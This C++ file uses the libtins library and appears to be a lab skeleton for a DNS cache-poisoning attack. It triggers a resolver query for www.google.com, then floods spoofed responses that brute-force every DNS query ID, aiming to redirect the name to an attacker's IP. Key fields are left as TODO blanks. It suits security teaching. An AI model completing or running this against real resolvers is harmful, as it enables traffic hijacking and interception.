#include <tins/tins.h>
#include <iostream>
#include <string>
#include <cstdlib>
#include <ctime>
#include <chrono>
#include <thread>

using namespace Tins;
using namespace std;

int main() {

    srand(time(0));    // Seed random number generator for DNS query ID

    // Configuration variables
    string target_domain = "www.google.com";    // Target domain to spoof
    string authoritative_ns_ip = TODO;    // Spoofed source (pretending to be authoritative DNS)
    string recursive_ns_ip = "10.0.0.40";    // Target recursive DNS server
    string attacker_ip = "10.0.0.10";
    string attacker_server_ip = "10.0.0.20";    // IP we want to redirect traffic to
    int recursive_ns_port = TODO;   // Port of recursive DNS server

    PacketSender sender;    // Packet sending utility from libtins

    /**********************************************
     * STEP 1: Send legitimate DNS query to trigger the recursive DNS server
     **********************************************/

    // Create DNS query packet
    DNS dns;
    dns.id(rand() % 65536);    // Random query ID
    dns.type(DNS::QUERY);    // This is a query packet
    dns.recursion_desired(1);    // Set RD flag to true
    dns.add_query(DNS::Query(
        target_domain,    // Domain to query
        DNS::TODO,  // Record type
        DNS::IN    // Internet class (standard)
    ));

    UDP udp(53, 53);    // Create UDP layer (destination/source port 53)
    udp /= dns;    // Attach DNS payload

    IP ip = IP(TODO, attacker_ip) / udp; // IP(destination_ip,source_ip)

    sender.send(ip);    // Send the initial legitimate query

    /**********************************************
     * STEP 2: DNS cache poisoning attack
     * Flood with spoofed responses trying to guess the correct query ID
     **********************************************/
    std::this_thread::sleep_for(std::chrono::milliseconds(3));
    for (int id = 0; id <= 65535; ++id) {
        // Create spoofed DNS answer packet
        DNS dns;
        dns.id(id);    // Try all possible IDs (brute force)
        dns.type(DNS::RESPONSE);    // This is a response packet
        dns.add_query(DNS::Query(target_domain, DNS::A, DNS::IN));    // Same as the previous query
        TODO // Add the answer section with the spoofed IP


        UDP udp(TODO, 53);    // UDP(destination_port, source_port)
        udp /= dns;    // Attach DNS payload

        IP ip = IP(recursive_ns_ip, TODO) / udp;    // IP(destination_ip, source_ip)

        sender.send(ip); // Send the spoofed response
        if (id % 1000 == 0) {
            cout << "Sent packet ID: " << id << endl;
        }
    }

    return 0;
}